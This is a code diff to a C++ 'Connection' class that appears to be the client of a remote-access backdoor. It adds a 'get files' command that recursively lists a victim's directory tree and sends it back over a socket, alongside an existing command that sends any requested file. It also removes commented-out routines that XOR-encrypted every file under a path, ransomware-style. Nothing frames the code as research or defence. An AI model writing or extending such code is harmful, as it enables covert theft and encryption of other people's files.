@@ -23,7 +23,7 @@ void Connection::sendFile(string path) {
 
     while (!file.eof()) {
         file.read(buffer.data(), BUFFER_SIZE);
-        send(sock, buffer.data(), static_cast<int>(file.gcount()), 0);
+        send(sock, buffer.data(), file.gcount(), 0);
     }
     file.close();
     return;
@@ -51,15 +51,14 @@ void Connection::sendFile(string path) {
 //    return;
 //}
 
-//vector<filesystem::path> &Connection::getAllFiles(string path, vector<filesystem::path> files) {
-//
-//
-//    for (filesystem::directory_entry file : filesystem::recursive_directory_iterator(path)) {
-//        files.push_back(file.path());
-//    }
-//    return files;
-//}
-//
+string Connection::getAllFiles(string path) {
+    string files;
+    for (filesystem::directory_entry file : filesystem::recursive_directory_iterator(path)) {
+        files += file.path().string() + "\n";
+    }
+    return files;
+}
+
 //string Connection::readFile(filesystem::path path) {
 //    ifstream file{path.string(), ifstream::binary};
 //    unique_ptr<vector<char>> buffer = make_unique<vector<char>>(BUFFER_SIZE + 1, 0);
@@ -80,29 +79,6 @@ void Connection::sendFile(string path) {
 //    return;
 //}
 //
-//string Connection::encryptData(string data, string key) {
-//
-//    if (key.size() < data.size()) {
-//        for (int i = 0; i < data.size(); i++) {
-//            key += key.at(i);
-//            if (key.size() == data.size()) {
-//                break;
-//            }
-//        }
-//    }
-//    string newData = "";
-//    for (int i = 0; i < data.size(); i++) {
-//        newData += char(int(data.at(i)) ^ int(key.at(i)));
-//    }
-//    return newData;
-//}
-
-//void Connection::encryptFiles(string path) {
-//    getAllFiles(path, *files);
-//    for (int i = 0; i < files->size(); i++) {
-//        writeToFile(files->at(i), encryptData(readFile(files->at(i)), "Test"));
-//    }
-//}
 
 string Connection::e1(string &b1) {
     char buffer[128];
@@ -188,7 +164,15 @@ void Connection::connection() {
             command = command.substr(10, command.size() - 1);
             sendFile(command);
             continue;
+        } else if (!command.rfind("get files")) {
+            command = command.substr(10, command.size() - 1);
+            string files = getAllFiles(command).c_str();
+            sendMessage(to_string(files.size()).c_str());
+            sendMessage(files.c_str());
+            continue;
+            //sendMessage(reinterpret_cast<const char *>(files.size()));
         }
+
         //The command is not exist
         string cantFind = "The command " + command + " was not found";
         sendMessage(cantFind.c_str());
